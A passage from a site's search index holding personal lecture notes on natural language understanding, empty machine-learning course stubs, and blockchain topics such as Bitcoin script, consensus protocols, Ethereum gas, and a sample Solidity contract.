"},{"id":118,"href":"/notes/cs224u/2021-03-29-course-overview/","title":"Course Overview","section":"CS 224U, Spring 2021","content":" Why Natural Language Understanding? # Perfect moment because the field is at or near peak Recent resurgence of interest Heavy industry use Still many weaknesses in existing systems Far from solved - still remain big breakthroughs to be found Course info # Course site: https://cs224u.stanford.edu\nCode repo: https://github.com/cgpotts/cs224u\nTopics # Vector-space models Sentiment analysis Contextual word representations Grounded language generation Relation extraction Natural Language Inference NLU and info. retrieval Adversarial testing Methods and metrics Assignments # Word relatedness Cross-domain sentiment analysis Generating color descriptions in context Each assignment culminates in a bakeoff - informal competition in which original models are entered\n9/10 points for completing assignment\nBakeoff entries get full 1/10 credit if\nthey do well on the bakeoff metrics OR they are creative/well-motivated, even if they do not do well on the metrics Other entries get less than full credit\nFinal project/paper # Literature review Experiment protocol Final paper Course Policies # Grading # Quizzes 5% Homeworks and bakeoffs 40% Literature review 10% Experimental protocol 15% Final paper 30% "},{"id":119,"href":"/notes/cs224u/2021-03-31-vector-space-models/","title":"Vector Space Models","section":"CS 224U, Spring 2021","content":" Distributed word representations # Meaning representations # Co-occurrence matrix:\nMeaning can be present in such a matrix.\nIf a word co-occurs often with \u0026ldquo;excellent,\u0026rdquo; it likely is a positive word; if it co-occurs often with \u0026ldquo;terrible,\u0026rdquo; it likely denotes something negative Guiding hypothesis for vector-space models # The meaning of a word is derived from its use in a language. If two words have similar vectors in a co-occurrence matrix, they tend to have similar meanings (Turney and Pantel, 2010).\nFeature representations of data # the movie was horrible becomes [4, 0, 0.25] (4 words, 0 proper names, 0.25 concentration of negative words) Reduces noisy data to restricted feature set What do we define co-occurrence as? # For a sentence, e.g. from swerve of shore to bend of bay, brings\nConsider the word \u0026ldquo;to\u0026rdquo;\nWindow: how many words around \u0026ldquo;to\u0026rdquo; (in both directions) do we want to focus on? Scaling: how to weight words in the window? Flat: treat everything equally Inverse: word is weighted 1/n if it is distance n from the target word Larger, flatter windows capture more semantic information, whereas smaller, more scaled windows capture more syntactic information\nCan also consider different unit sizes - words, sentences, etc\nConstructing data # Tokenization Annotation Tagging Parsing Feature selection Matrix design # word x word # Rows and columns represent individual words Value a_ij in a matrix represents how many times words i and j co-occur with each other in a given set of documents Very dense (lots of nonzero entries)! Density increases with more documents in the corpus Dimensionality remains fixed as we bring in new data as long as we pre-decide on vocabulary word x document # Rows represent words; columns represent documents Value a_ij in a matrix represents how many times word i occurs in document j Very sparse: may be hard to compute certain operations, but easy storage word x discourse context # Rows represent words; columns represent discourse context labels Labels are assigned by human annotators based on what type of context the sentence is (i.e., acceptance dialogue, rejecting part of previous statement, phrase completion, etc) Value a_ij in a matrix represents how many times word i occurs in discource context j Other designs # word x search proximity adj x modified noun word x dependency relations Note: Models like GloVe and word2vec provide packaged solutions that pre-chose from these design choices.\nVector comparison (similarity) # Within the context of this example:\nNote that B and C are close in distance (frequency info), but A and B have a similar bias (syntactic/semantic info)\nEuclidean # For vectors u, v of n dimensions:\nThis measures the straight-line distance between u and v capturing the pure distance aspect of similarity\nNote: Length normalization\nThis captures the bias aspect of similarity\nCosine # For vectors u, v of n dimensions:\nDivision by the length effectively normalizes vectors Captures the bias aspect of similarity Not considered a proper distance metric because it fails the triangle inequality; however, the following does: But the correlation between these two metrics is nearly perfect, so in practice, use the simpler one Other metrics # Matching Dice Jaccard KL (distance between probability distributions) Overlap Reweighting # Goal: Amplify important data useful for generalization, because raw counts/frequency are poor proxy for semantic information\nNormalization # L2 norming (see above) Probability distribution: divide values by sum of all values Observed/Expected # Intuition: Keeps words in idioms co-occurring more than expected; other word pairs co-occur less than expected\nPointwise Mutual Information (PMI) # This is the log of observed count divided by expected count.\nPositive PMI # PMI undefined when X_{ij} = 0. So:\nTF-IDF # For a corpus of documents D:\nDimensionality reduction # Latent Semantic Analysis # Also known as Trucated Singular Value Decomposition (Truncated SVD) Standard baseline, difficult to beat Intuition:\nFitting a linear model onto data encourages dimensionality reduction (since we can project data onto the model); this captures greatest source of variation in the data We can continue adding linear models to capture other sources of variation Method:\nAny matrix of real numbers can be written as\nwhere S is a diagonal matrix of singular values and T and D^T are orthogonal. In NLP, T is the term matrix and D^T is the document matrix.\nDimensionality reduction comes from being selective about which singular values and terms to include (i.e., capturing only a few sources of variation in the data).\nAutoencoders # Flexible class of deep learning architectures for learning reduced dimensional representations Basic autoencoder model:\nGloVe # Goal is to learn vectors for words such that their dot product is proportional to their log probability of co-occurrence "},{"id":120,"href":"/notes/cs224u/2021-04-12-sentiment-analysis/","title":"Sentiment Analysis","section":"CS 224U, Spring 2021","content":" Supervised sentiment analysis # Tokenization # Whitespace tokenizer # Very simple, just splits sentences into words by spacing. Example:\n\u0026gt; whitespace_tokenizer(\u0026#34;The quick fox jumped over the lazy dog.\u0026#34;) [\u0026#39;The\u0026#39;, \u0026#39;quick\u0026#39;, \u0026#39;fox\u0026#39;, \u0026#39;jumped\u0026#39;, \u0026#39;over\u0026#39;, \u0026#39;the\u0026#39;, \u0026#39;lazy\u0026#39;, \u0026#39;dog.\u0026#39;] Note: simplest version will not take punctuation into account, which could be disruptive for using with VSMs\nSentiment-aware tokenizer # Ideally, a tokenizer would\nIsolate emoticons Respects domain-specific markup (i.e., hashtags and @-mentions) Uses underlying markup Capture masked curses such as f@#$%ing Preserve meaningful capitalization Regularizes lengthening (i.e., YAAAAAY =\u0026gt; YAAY) Captures multiword expressions such as idioms such as out of this world ex:\nsentiment_tokenizer(\u0026#34;@NLUers: can\u0026amp;#39;t wait for the Jun 9 #projects! YAAAAAAY!!! \u0026amp;gt;:-D http://stanford.edu/class/cs224u/.\u0026#34;) [\u0026#39;@nluers\u0026#39;, \u0026#39;:\u0026#39;, \u0026#39;can\\\u0026#39;t\u0026#39;, \u0026#39;wait\u0026#39;, \u0026#39;for\u0026#39;, \u0026#39;the\u0026#39;, \u0026#39;Jun_9\u0026#39;, \u0026#39;#projects\u0026#39;, \u0026#39;!\u0026#39;, \u0026#39;YAAAY\u0026#39;, \u0026#39;!\u0026#39;, \u0026#39;!\u0026#39;, \u0026#39;!\u0026#39;, \u0026#39;\u0026gt;:-D\u0026#39;, \u0026#39;http://stanford.edu/class/cs224u/\u0026#39;, \u0026#39;.\u0026#39;] Most of these criteria are met by nltk.tokenize.casual.TweetTokenizer (for Tweets)\nOther preprocessing techniques # Part-of-speech tagging Tag each word as verb/noun/adjective/adverb/\u0026hellip; and pre-apply positive/negative sentiment to each word-POS pair Limits: (Word, POS) pair can have two sentiments in different contexts Simple negation marking Append a _NEG suffix to every word appearing between a negation and a clause-level punctuation mark Example: No one enjoys it. becomes ['no', 'one_NEG', 'enjoys_NEG', 'it_NEG', '.'] Hyperparameter search # Model parameters: values learned as part of optimizing the model Hyperparameters: parameters set outside of optimization GloVe or LSA dimensionality GloVe x_max and alpha Regularization terms, hidden dimensionalities, learning rates, activation functions Must be done to properly get to \u0026ldquo;optimal\u0026rdquo; model Done only with train/development data Feature representation # N-grams # Unigrams: \u0026ldquo;bag-of-words\u0026rdquo; models Generalize to \u0026ldquo;bag-of-ngrams\u0026rdquo; Dependent on tokenization scheme Can be combined with preprocessing steps with _NEG marking Creates very large, very sparse feature representations Generally fails to directly model feature relationships Other ideas # Lexicon-derived features Negation marking Modal adverbs Length-based features Thwarted expectations: ratio of positive to negative words RNN classifiers # "},{"id":121,"href":"/notes/cs229/2021-09-21-intro/","title":"Intro","section":"CS 229, Fall 2021","content":" Intro # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":122,"href":"/notes/cs229/2021-09-23-supervised-learning-setup/","title":"Supervised Learning Setup","section":"CS 229, Fall 2021","content":" Supervised learning setup # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":123,"href":"/notes/cs229/2021-09-28-logistic-regression/","title":"Logistic Regression","section":"CS 229, Fall 2021","content":" Logistic regression # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":124,"href":"/notes/cs229/2021-09-30-generalized-linear-models/","title":"Generalized Linear Models","section":"CS 229, Fall 2021","content":" Generalized linear models # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":125,"href":"/notes/cs229/2021-10-05-generative-learning-algorithms/","title":"Generative Learning Algorithms","section":"CS 229, Fall 2021","content":" Generative learning algorithms # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":126,"href":"/notes/cs229/2021-10-07-naive-bayes/","title":"Naive Bayes","section":"CS 229, Fall 2021","content":" Naive bayes # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":127,"href":"/notes/cs229/2021-10-12-kernel-methods-and-svm/","title":"Kernel Methods and Svm","section":"CS 229, Fall 2021","content":" Kernel methods and SVM # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":128,"href":"/notes/cs229/2021-10-14-deep-learning/","title":"Deep Learning","section":"CS 229, Fall 2021","content":" Deep learning # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":129,"href":"/notes/cs229/2021-10-19-deep-learning-optimization/","title":"Deep Learning Optimization","section":"CS 229, Fall 2021","content":" Deep learning optimization # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":130,"href":"/notes/cs229/2021-10-21-model-selection/","title":"Model Selection","section":"CS 229, Fall 2021","content":" Model selection # Previous Next \u0026nbsp; \u0026nbsp; Page: / "},{"id":131,"href":"/notes/cs251/2022-09-26-intro/","title":"Intro","section":"CS 251, Fall 2022","content":" CS 251 Blockchain and Cryptocurrency Technologies # This course # Brings together: cryptography, distributed systems, economics Course organization # The starting point: Bitcoin mechanics Consensus protocols Ethereum and decentralized applications DeFi: decentralized applications in finance Private transactions on a public blockchain: SNARKs and zero-knowledge proofs Scaling the blockchain: getting to 10K transactions/sec Interoperability among chains: bridges and wrapped coins What is a blockchain? # Consensus layer: public append-only data structure Persistence: can never remove added data Safety: all honest participants have same data Liveness: honest participants can add new transactions Open: anyone can add data (no authentication) Not strict requirement How are blocks added to chains? End users A, B, C with secret keys SKA, SKB, SKC Transactions sent to miners (validators) that operate blockchains One validator randomly selected to create the next block Next block sent to distributed other validators, validator gets \u0026ldquo;block reward\u0026rdquo; for work done in creating the block Other validators verify transactions, lead validator only gets reward if transaction is verified Why is consensus hard? Good case: all copies are the same and valid Problems: Network delays: can affect transaction order Network partition (severing connections between two parts of the world): how to merge lists after partition is resolved? Crashes Malicious participants Blockchain computer Decentralized applications (DAPPs) Run on blockchain: code and state written on chain Accept transactions from users: state transitions recorded on chain User-facing servers Cloud frontend that interact with DAPPs on change End-users issue transactions via these servers Cryptography background # See CS255 notes.\n"},{"id":132,"href":"/notes/cs251/2022-09-28-bitcoin-mechanics/","title":"Bitcoin Mechanics","section":"CS 251, Fall 2022","content":" Bitcoin mechanics # Overview of the Bitcoin consensus layer # Miners broadcast received transaction (Tx) to peer-to-peer (P2P) network Every miner validates received Tx and stores them in its mempool (unconfirmed Tx set) Implication: miners see all Tx before posted on chain Every ~10 minutes: Each miner creates a candidate block from Tx in its mempool A \u0026ldquo;random\u0026rdquo; miner is selected and broadcasts its block to P2P network Selected miner is paid 6.25 BTC in coinbase Tx (first Tx in the block) Only way new BTC is created Block reward halves every four years Max 21M BTC (currently at 19.1M BTC) Economically: this inflates the currency - more supply means each individual BTC gets slightly devalued Note: miner chooses order of Tx in block The bitcoin blockchain # Block headers # Blockchain: a sequence of block headers, 80 bytes each Fields: version (4b) prev (link to prev. block) (32b) time - self-report of time miner assembled block (4b) bits - PoW difficulty (4b) nonce - PoW solution (4b) Merkle root - payer can give short proof Tx is in the block New block every ~10 min This lecture: view blockchain as Tx sequence (append only) Transaction structure (non-coinbase) # Inputs: assets going into transaction TxID - 32b hash equal to H(Tx) (hash) out-index - 4b index ScriptSig - program seq - ignore (segwit) Witnesses: part of input outputs: who gets funds? value - 8b specified in Satoshis #BTC = value/108 ScriptPK- program locktime: earliest block number that can include Tx Validating a transaction # Miners check for each input: The program ScriptSig | ScriptPK (concatenation) returns true TxID | index is in the current UTXO (unspent transaction output) set Sum input values \u0026gt;= sum output values Spend UTXO - remove from UTXO set in memory Bitcoin script # A stack machine Not Turing complete: no loops Op codes: OP_TRUE or (OP_1) (81), OP_2 (82), \u0026hellip;, OP_16 (96) OP_DUP (118): push top of stack onto stack Control (99) OP_IF \u0026lt;statements\u0026gt;, OP_ELSE \u0026lt;statements\u0026gt;, OP_ENDIF (105) OP_VERIFY: abort fail if top = false (106) OP_RETURN: abort and fail for ScriptPK = [OP_RETURN, \u0026lt;data\u0026gt;] where \u0026lt;data\u0026gt; is not a script (136) OP_VERIFY: pop, pop, abort fail if pops not equal Arithmetic OP_ADD, OP_SUB, OP_AND, \u0026hellip;: pop two items, operate, push Crypto OP_SHA256: pop, hash, push OP_CHECKSIG: pop sig, pop pk, verify sig. on TX, push 0 or 1 Time: OP_CheckLockTimeVerify (CLTV) fail if value at top of stack \u0026gt; Tx locktime value usage: UTXO can specify min time where it can be spent Transaction types # P2PKH: pay to public key hash e.g. Alice wants to pay Bob 5 BTC Bob generates sig key pair (pk_b, sk_b) \u0026lt;- Gen() Bob computes bitcoin addr addr_b \u0026lt;- H(pk_b) Bob sends addr_b to Alice Alice posts Tx input: 7 BTC utxo_B for Bob: 5 BTC, ScriptPK_b ScriptPK_b: DUP HASH256 \u0026lt;addr_b\u0026gt; EQVERIFY CHECKSIG utxo_A for Alice: 2 BTC, ScriptP_a locktime: 0 P2SH: pay to script hash Payer specifies a redeem script (instead of just pkhash) Bob publishes hash(redeem_script) \u0026lt;- bitcoin_addr Alice sends funds to that address in funding Tx Bob can spend UTXO if he satisfy the script ScriptPK in UTXO: HASH160 H(redeem_script) EQUAL Payer can specify complex conditions for when UTXO can be spent e.g. Multisig: Goal: spending UTXO requires t out of n signatures (i.e. 2/3) Redeem script for 2 of 3 (chosen by payer): \u0026lt;2\u0026gt; \u0026lt;PK1\u0026gt; \u0026lt;PK2\u0026gt; \u0026lt;PK3\u0026gt; \u0026lt;3\u0026gt; CHECKMULTISIG hash gives P2SH address ScriptSig to spend (by Payee): \u0026lt;0\u0026gt; \u0026lt;sig1\u0026gt; \u0026lt;sig3\u0026gt; \u0026lt;redeem_script\u0026gt; Segregated Witness # ECDSA malleability:\nGiven (m, sig) anyone can create (m, sig') with sig != sig' miner can change sig in Tx and change TxID = SHA256(Tx) Tx issuer cannot tell what TxID is until Tx is posted leads to problems and attacks With segregated witnesses, signature is moved to witness field in Tx TxID = Hash(Tx without witnesses) "},{"id":133,"href":"/notes/cs251/2022-10-03-bitcoin-scripts-and-wallets/","title":"Bitcoin Scripts and Wallets","section":"CS 251, Fall 2022","content":" Bitcoin Scripts and Wallets # Managing secret keys # Users can have many PK/SK: per BTC/ETH/SOL/etc. addresses Wallets: Generate PK/SK and store SK Post and verify Tx Show balances Types of wallets: Cloud (e.g. Coinbase): like a bank, managed service Laptop/phone: electrum, metamask Hardware: Trezor, Ledger, Keystone, etc Paper: print all sk on paper Brain: memorize sk (bad idea) Hybrid: non-custodial cloud wallet (using threshold signatures) Need to safely manage keys: lose keys =\u0026gt; lose funds Hardware wallets # e.g. Ledger Nano X Connects to laptop or phone wallet using bluetooth or USB Manages many secret keys Each coin type is an app on top of OS PIN to unlock hardware: up to 48 digits Screen and buttons to verify and confirm Tx Backing up a hardware wallet: Idea 1: generate a secret seed, where each PK is based on a HMAC of the seed Seed is stored on HW device and in offline storage (as 24 words) In case of loss, buy new device, restore seed, recompute keys Open-source code to do this recomputation for you if hardware wallet manufacturer goes out of business "},{"id":134,"href":"/notes/cs251/2022-10-05-consensus/","title":"Consensus","section":"CS 251, Fall 2022","content":" Fundamentals of Consensus # Byzantine Generals Problem (Lamport et al., 1982) # N (fixed) generals, one is commander Some generals are loyal, some are traitors (incl. commander) Commander sends out order to attack or retreat Commander is loyal: send out same order to all generals Commander is traitor: sends out different orders to confuse Goal: all loyal generals should take the same action Which should be the one issued by the commander, if commander is loyal Generalized consensus problem # Solution to a consensus problem is a consensus protocol To generalize Byzantine Generals Probelm: generals are nodes, the commander is the leader, loyal generals are honest nodes, traitors are the adversary The adversary # Role of an adversary: corrupt nodes, making them adversarial Types of adversaries: Induces crash faults if the adversarial nodes do not send or receive any messages Induces omission faults if the adversarial nodes can selectively choose to drop or let through messages sent or received Note: omission fault adv. can emulate crash fault adv. in all cases =\u0026gt; stronger adversary Byzantine faults (Byzantine adversary): adversarial nodes can deviate from protocol arbitrarily Typical assumption: adversary cannot forge signatures Adaptive vs. static adversary: Static adversary: corrupts nodes of its choice pre-protocol execution Adaptive adversary: can dynamically corrupt nodes during protocol execution Bounds on adversary\u0026rsquo;s power: Assume upper bound on number of nodes $f$ that can be adversarial, as a fraction of the $n$ nodes Communication # Nodes can send messages to each other within the protocol Time proceeds in discrete rounds Adversary controls delivery of messages, with limits: Synchronous network: adversary must deliver messages sent by honest nodes to recipients within $d$ rounds Async. network: adversary can delay any message for arbitrary, but finite, number of rounds Partial synchrony: exists a known $t$ and event called Global Stabilization Time (GST) where GST eventually happens after some finite time that can be chosen arbitrarily by adversary Message sent by honest node at round $t$ is delivered to recipient by round $d + max(GST, t)$ In effect, network async. until GST, after which it behaves like synchronous State machine replication (SMR) # Theoretically, could have centralized bank, but want to decentralize SMR participants: Replicas: receive transactions, execute SMR protocol Clients: learners, each outputs a log Tries to learn what correct ledger should be Goal: ensure clients output same logs Compared to Byzantine Generals Problem: this is multi-shot: log is continuously output, rather than single value output Also: learners (log output) are separate from nodes executing protocol e.g. Replicas $r_1 \\ldots r_5$, Clients $c_1 \\ldots c_4$ Replicas receive transactions $tx_1 \\ldots tx_4$ Clients ask replicas what log sequence should be Security for SMR # Let $LOG_t^{i}$ be the log ouptut by client $i$ at round $t$ Secure SMR protocol guarantees: Safety (consistency): for clients $i, j$, times $t, s$: $LOG_t^{i}$ should be a prefix of $LOG_s^{j}$, or vice versa Liveness: if a transaction $tx$ is output to a honest replica at some time $t$, then for all clients $i$, times $s \\ge t + T_{conf}$, then $tx \\in LOG_s^{i}$ Baby streamlet # Time: epochs of $2d$ rounds For each epoch $e$, leader $L_e$ chosen by public hash function $H$ Blocks: each block is associated with an epoch $n$ replicas, fixed before protocol execuction, every replica knows all other replica public keys (creating authenticated communication channels) At each epoch $e = 1, 2, \\ldots$: Propose: at start of epoch $e$, $L_e$ identifies longest seen chain and proposes new block extending that chain Finalization rule: client finalizes block (and prefix) at tip of longest chain; tiebreak by smaller epoch Proving security under $f \u0026lt; n/3$, partial synchrony, Byzantine adversary: Safety: no two blocks can be finalized at the same height However, with adversarial leader and pre-GST: Adv. sends $B_1$ to Alice, which gets notarized Adv. sends $B_2$ to Bob, which gets notarized Both are plopped on top of $B_1$ at the same time, which is not safe Therefore, Baby Streamlet is not safe (so not secure)! Teen streamlet # Setup: same as baby streamlet Additionally: votes: vote on block by a replica is its signature on the block Notarization: block notarized in view of replica or client if observed over $2n/3$ signatures from distinct replicas on the block At each epoch, in adition to propose: Vote: $d$ rounds into epoch $e$: each honest replica votes for first valid epoch $e$ proposal from $L_e$ that extends longest notarized chain in its view. If no such block, no vote Finalization rule: client finalizes block and prefix once observed notarization of block Proving security under same constraints: Safety: now works under constraints, because cannot get over $2n/3$ votes for duplicate notarization with only adversarial votes Streamlet # At each epoch: Propose: leader $L_e$ identifies longest notarized chain that it has seen so far and proposes new block extending that chain; tiebreak adversarial Vote: same as teen streamlet Finalization rule: upon seeing three adj. blocks in notarized chain with consecutive epoch numbers, client finalizes second of three blocks and entire prefix change Secure: yes However, inefficient: requires $\\Theta(n^3)$ messages per block Protocols like HotStuff are as secure and achieve $\\Theta(n)$ message complexity per block "},{"id":135,"href":"/notes/cs251/2022-10-10-internet-consensus/","title":"Internet Consensus","section":"CS 251, Fall 2022","content":" Consensus on the internet # Characterized by open participation:\nAdversary can create many Sybil nodes to try to take care of the protocol Honest participants come and go at will Goals:\nLimit adversary\u0026rsquo;s participation - Sybil resistance Maintain availability (liveness) of protocol against fluctuating participation by honest nodes - dynamic availability Sybil-resistant protocols # How to select nodes to participate in consensus? Permissioned: fixed set of nodes (e.g., previous lecture) Permissionless: anyone satisfying certain criteria can participate However, we can\u0026rsquo;t accept anyone with a signing key: sybil attack Sybil attack: single node pretends to be multiple fake identities to gain network influence Example sybil-resistant protocols: Proof-of-work: computational power dedicated to protocol; e.g. Bitcoin, Ethereum (pre-Sep. 2022) Proof-of-stake: total number of coins dedicated to protocol; e.g. Algorand, Cardano, Ethereum (since Sep. 2022) Proof-of-space/time: total storage across time dedicated to protocol; e.g., Chia, Filecoin Bitcoin consensus # To mine new block, miner must find nonce such that H(h_prev, txn_root, nonce) \u0026lt; 2^256/D D difficulty: how many nonces on average do miners try until finding a block? Each miner tries different nonces until one finds a nonce that satisfies above equation Nakamoto consensus # Fork-choice/proposal rule: at any given round, each miner attemps to extend (i.e., mine tip of) longest chain its view, ties broken adversarially Confirmation rule: each miner confirms block (along w/ prefix) that is $k$-deep with longest chain in view Leader-selection rule: proof-of-work Security for Bitcoin # Show that Bitcoin is secure under synchrony against Byzantine adversary Best possible resistance: $\\beta \u0026lt; 1/2$ Thm: If $\\beta \u0026lt; 1/2$, then there exists a $\\lambda(\\delta, \\beta)$ where Bitcoin satisfies security except with probability $e^{-\\Omega(k)}$ under synchronous attack "},{"id":136,"href":"/notes/cs251/2022-10-17-ethereum/","title":"Ethereum","section":"CS 251, Fall 2022","content":" Ethereum # Limitations of Bitcoin # UTXO contains ScriptPK or hash thereof Simple script: indicates conditions when UTXO can be spent However: difficult to maintain state in multi-stage contracts or to enforce global rules on assets e.g. rate limiting: if wallet has 100 UTXOs, and want to enforce transfer of max 2BTC per day out of wallet, this is impossible! Example: NameCoin # DNS on the blockchain Need operations: Name.new(OwnerAddr, DomainName): intent to register Name.update(DomainName, newVal, newOwner, OwnerSig) Name.lookup(DomainName) note: also need to ensure no front-running on Name.new() UTXO for new, update: DUP HASH256 \u0026lt;OwnerAddr\u0026gt; EQVERIFY CHECKSIG VERIFY \u0026lt;NAMECOIN\u0026gt; \u0026lt;DomainName\u0026gt; \u0026lt;IPAddr\u0026gt; \u0026lt;1\u0026gt; Limitation: cannot enforce \u0026ldquo;if I own a domain name, nobody else can register or update to that domain name\u0026rdquo; Required a fork of Bitcoin to achieve However: gave rise to Ethereum, which natively supports global state Cryptocurrencies as state transition systems # Bitcoin: each transaction is a function mapping from set of possible world states, set of possible inputs -\u0026gt; set of possible world states Limited functionality in these transactions: the mutation only executes over UTXOs transforming one UTXO to another UTXO Ethereum: much richer state transaction function One transition executes an entire program Ethereum applications # Ethereum DApps include: New coins: ERC-20 standard interface Decentralized finance: exchanges, lending, stablecoins, derivatives, etc Insurance Decentralized organizations NFTs: managing asset ownership (ERC-721 interface) DApps run on: Base: consensus layer: beacon chain Compute layer: execution chain Create DApp w/Program Code, runs on compute layer mapping states to states with transactions as transitions The Ethereum system # Consensus layer: proof-of-stake # One block every 12 seconds; about 150 Tx per block Block proposer receives Tx fees for the block, along with other rewards Beacon chain: Eth2 (post-Sep. 2022) consensus layer Validators, not miners To become a validator: stake (lock up) 32 ETH, or use Lido Validators: Sign blocks to express correctness Occasionally propose blocks (chosen at random) Correct behavior: issued new ETH every epoch (32 blocks) Incorrect behavior: slashed When consensus reached: notify_new_payload(payload) (Engine API) called, sends transactions to compute layer Compute layer: Ethereum Virtual Machine # World state: set of accounts identified by 32-byte address Types of accounts: Owned accounts: controlled by ECDSA signing pair (pk, sk) Contracts: controlled by code (set at account creation time, does not change) EVM structure and instructions # Stack machine (like Bitcoin) but with JUMP (so loops allowed) Max stack depth = 1024 Program aborts if stack size exceeded; block proposer keeps gas Contract can create or call another contract Opcodes at evm.codes Two types of zero-initialized memory: Persistant storage (on blockchain), to use SLOAD, SSTORE (expensive) Volatile memory (for single Tx): MLOAD, MSTORE (cheap) LOG0(data): write data to log Every instruction costs gas: SSTORE \u0026lt;addr\u0026gt;, \u0026lt;value\u0026gt; (32 byte variables each) zero -\u0026gt; nonzero: 20,000 gas nonzero -\u0026gt; nonzero: 5,000 gas (for a cold slot) nonzero -\u0026gt; zero: 15,000 gas refund (example) Refunds given for reducing size of blockchain state: incentivizes contracts to clean up after themselves However: refund has a maximum, cannot make money by just cleaning up the blockchain CREATE: 32,000 + 200x code size gas CALL gas, addr, value, args: call another contract SELFDESTRUCT addr: kill current contract, 5000 gas Account data # Address (computed): Owned, H(pk) Contracts: H(CreatorAddr, CreatorNonce) Code: Owned: none Contracts: CodeHash Storage root (state): Owned: none Contracts: StorageRoot Balance (in Wei = 10-18 ETH, note GigaWei often used = 10-9 ETH) Both for humans and contracts Nonce: Both for humans and contracts Nonce = number of Tx sent + number of accounts created: anti-replay mechanism Account state: persistent storage # Every contract has associated storage array S[] w/capacity 2256-1, where each cell holds 32 bytes, init to 0 Account storage root: Merkle Patricia Tree, keys are hash of S[] Due to cannot compute full Merkle tree hash: 2256 leaves State transitions: Tx and messages # Transactions: signed data by initiator, fields: To: 32-byte address of target (0 means create new account) From, [Signature]: initiator address and signature on Tx (if owned) Value: # Wei being sent with Tx Tx fees (EIP 1559): gasLimit, maxFee, maxPriorityFee if To = 0: create new contract code = (init, body) if To != 0: data = (function, args) Nonce: must match current nonce of sender (to prevent Tx replay) Transaction types: owned -\u0026gt; owned: transfer ETH between users owned -\u0026gt; contract: call contract w/ETH and data contract -\u0026gt; owned: contract sends funds to user contract -\u0026gt; contract: one program calls another (and sends funds) Enables composability of contracts One transaction from user can lead to many Tx processed An Ethereum Block # Validators collect Txs from users =\u0026gt; proposer creates a block of n Tx To produce block, do: for i = 1,\u0026hellip;,n: execute state change of Txi sequentially (can change state of \u0026gt;n accounts) record updated world state in block Other validators revalidate all Tx to verify block sign block if valid; if enough sigs, finalizes epoch Block headers: Consensus data: proposer ID, parent hash, votes, etc Address of gas beneficiary (Tx fee recipient) World state root: updated world state Merkle Patricia Tree hash of all accounts in system Tx root: Merkle hash of all Tx processed in block Tx receipt root: Merkle hash of all log messages generated in block Gas used: used to adjust gas price (target 15M gas per block) Total blockchain size, ETH world, Oct. 2022: 12TB Gas calculation # Why charge Tx fees (gas)? Gas prevents submitting Tx that runs for many steps During high load: block proposes Tx from mempool that maximize its income Gas prices spike during congestion Old EVM (prior to Aug. 2021): Every Tx contains a gasPrice \u0026ldquo;bid\u0026rdquo; (gas -\u0026gt; Wei conversion bid) Producer chooses Tx w/highest gasPrice (max sum(gasPrice * gasLimit)) Not an efficient auction mechanism Changed Aug. 2021 to second-choice auction type design EIP1559 EVM gas calculation: Every block has a baseFee: minimum gasPrice for Tx in the block baseFee computed from total gas in earlier blocks Earlier blocks at gas limit (30M gas) - lots of congestion: base fees goes up 12.5% to discourage participation Earlier blocks empty - no congestion: base fee decreases by 12.5% to encourage participation If earlier blocks at \u0026ldquo;target size\u0026rdquo; (15M gas): base fee does not change Transaction specifies three parameters: gasLimit: max total gas allowed for Tx maxFee: maximum allowed gas price maxPriorityFee: additional \u0026ldquo;tip\u0026rdquo; to be paid to block proposer Computed gasPrice bid in Wei: gasPrice \u0026lt;- min(maxFee, baseFee + maxPrioirityFee) Max gas: gasLimit * gasPrice Algorithm: if gasPrice \u0026lt; baseFee: abort if gasLimit * gasPrice \u0026gt; msg.sender.balance: abort deduct gasLimit * gasPrice from msg.sender.balance set Gas \u0026lt;- gasLimit execute Tx: deduct gas from Gas for each instruction if at end Gas \u0026lt; 0: abort, mark Tx invalid (proposer keeps gasLimit * gasPrice) Refund Gas * gasPrice to msg.sender.balance (leftover change) gasUsed \u0026lt;- gasLimit - Gas Burn gasUsed * baseFee (destroys ether, deflation) Send gasUsed * (gasPrice - baseFee) to block producer (tip) Why burn ETH? Goals of EIP1559: Incentivize users to bid true utility for posting Tx Incentivize block proposer to not create fake Tx Disincentivize off-chain agreements Without burn (i.e., baseFee given to block producer): In periods of low Tx, volume proposer would try to increase volume by offering to refund baseFee off-chain to users "},{"id":137,"href":"/notes/cs251/2022-10-19-solidity/","title":"Solidity","section":"CS 251, Fall 2022","content":" Solidity # Etherum contracts: write code in Solidity (most common) or other frontend languages Compiles to EVM bytecode Validators use EVM to execute contract bytecode in response to Tx An example contract: NameCoin contract nameCoin { struct nameEntry { address owner; bytes32 value; } mapping (bytes32 =\u0026gt; nameEntry) data; // insecure: front-running bug, can be solved using committments function nameNew(bytes32 name) { // registration cost is 100 Wei if (data[name] == 0 \u0026amp;\u0026amp; msg.value \u0026gt;= 100) { data[name].owner = msg.sender; // record domain owner emit Register(msg.sender, name); // log event } } function nameUpdate(bytes32 name, bytes32 newValue, address newOwner) { if (data[name].owner == msg.sender \u0026amp;\u0026amp; msg.value \u0026gt;= 10) { data[name].value = newValue; data[name].owner = newOwner; } } // humans do not need this (i.e. etherscan.io) // used by other contracts function nameLookup(bytes32 name) { return data[name]; } } Contract structure # Inheritance # Everything is a contract, but some can be degenerate contracts (i.e., those that only contain interfaces and no implementations) interface IERC20 { function transfer(address _to, uint256 _value) external returns (bool); function totalSupply() external view returns (uint256); } contract ERC20 is IERC20 { // inheritance address owner; constructor() public { owner = msg.sender; } function transfer(address _to, uint256 _value) external returns (bool) { // implementation } } Value types # uint256 bytes32 address (bytes32) Functions: _address.balance, _address.send(value), _address.transfer(value) Calling other contracts to send Tx: bool success = _address.call{value: msg.value/2, gas: 100}(args); delegatecall: load code from other contract into current context bool Reference types # structs arrays bytes strings mapping (associative array): Declaration: mapping (address =\u0026gt; uint256) balances; Assignment: balances[addr] = value; All initialize at 0 Globally available variables # block; fields: blockHash coinbase gaslimit number timestamp gasLeft() msg (Tx data); fields: data (raw data) sender sig value tx; fields: gasprice origin abi; fields: encode encodePacked encodeWithSelector encodeWithSignature Cryptographic functions: keccack256() sha256() sha3() require e.g. require(msg.value \u0026gt; 100, 